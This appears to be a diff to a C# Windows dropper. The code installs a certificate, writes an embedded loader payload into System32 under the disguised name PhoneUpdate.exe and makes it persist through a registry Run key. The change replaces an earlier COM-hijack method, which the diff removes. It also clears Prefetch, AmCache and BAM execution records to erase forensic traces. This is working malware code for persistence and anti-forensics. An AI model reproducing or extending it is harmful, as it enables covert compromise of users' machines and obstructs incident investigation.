@@ -69,17 +69,20 @@ class P
             store.Close();
             Console.WriteLine("Certificate installed: " + pfx.Subject);
 
-            Console.WriteLine("Deploying signed loader...");
-            string dllPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "PhoneUpdate.dll");
-            byte[] loaderDll;
-            using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("loader.dll"))
-            { loaderDll = new byte[s.Length]; s.Read(loaderDll, 0, loaderDll.Length); }
-            File.WriteAllBytes(dllPath, loaderDll);
-            Console.WriteLine("Loader deployed: " + dllPath);
+            Console.WriteLine("Deploying loader...");
+            string exePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "PhoneUpdate.exe");
+            byte[] loaderExe;
+            using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("loader.exe"))
+            { loaderExe = new byte[s.Length]; s.Read(loaderExe, 0, loaderExe.Length); }
+            File.WriteAllBytes(exePath, loaderExe);
+            Console.WriteLine("Loader deployed: " + exePath);
 
-            Console.WriteLine("Registering COM hijack...");
-            RegisterCOM(dllPath);
-            Console.WriteLine("COM hijack registered");
+            Console.WriteLine("Registering Run key...");
+            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
+            {
+                key.SetValue("PhoneUpdate", exePath);
+            }
+            Console.WriteLine("Run key registered");
 
             Console.WriteLine("Clearing artifacts...");
             ClearPrefetch("vencord");
@@ -88,26 +91,12 @@ class P
             Console.WriteLine("Artifacts cleared");
 
             Console.WriteLine("Successful");
-            MessageBox(IntPtr.Zero, "Setup completed successfully.\nReboot to activate.\nLoader: System32\\PhoneUpdate.dll (signed)\nCOM: ShellBrowserWindow\nArtifacts: cleared", "Done", 0x40);
+            MessageBox(IntPtr.Zero, "Setup completed successfully.\nReboot to activate.\nLoader: System32\\PhoneUpdate.exe\nRun key: HKCU\\...\\Run\\PhoneUpdate\nArtifacts: cleared", "Done", 0x40);
         }
         catch (Exception ex)
         {
             Console.WriteLine("Failed: " + ex.Message);
             MessageBox(IntPtr.Zero, "Setup failed:\n" + ex.Message, "Error", 0x10);
-        }
-    }
-
-    static void RegisterCOM(string dllPath)
-    {
-        // ShellBrowserWindow — instantiated by Explorer at boot
-        // HKCU override — no admin needed, Explorer reads from both HKLM and HKCU
-        string clsid = "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}";
-        string keyPath = "Software\\Classes\\CLSID\\" + clsid + "\\InprocServer32";
-
-        using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(keyPath))
-        {
-            key.SetValue("", dllPath);
-            key.SetValue("ThreadingModel", "Both");
         }
     }
 
@@ -132,7 +121,6 @@ class P
     {
         try
         {
-            // AmCache stores exe info under HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Amcache\UnlinkedFile
             string amcPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Amcache\\UnlinkedFile";
             using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(amcPath, true))
             {
@@ -155,7 +143,6 @@ class P
     {
         try
         {
-            // BAM stores execution history under HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\{SID}
             string bamBase = "SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings";
             using (var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(bamBase))
             {
